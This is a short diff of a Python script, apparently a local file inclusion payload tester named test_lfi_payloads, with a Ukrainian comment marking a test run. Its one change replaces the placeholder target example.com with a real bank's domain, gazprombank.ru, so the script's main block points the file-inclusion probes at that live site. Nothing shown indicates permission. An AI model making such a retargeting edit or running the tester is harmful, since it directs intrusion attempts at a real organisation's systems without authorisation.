@@ -142,7 +142,7 @@ def test_lfi_payloads(
 # Тестовий запуск
 # -----------------------------------------
 if __name__ == "__main__":
-    base = "https://example.com/view.php?file=readme.txt"
+    base = "https://gazprombank.ru/view.php?file=readme.txt"
 
     test_results = test_lfi_payloads(base, param="file")
 
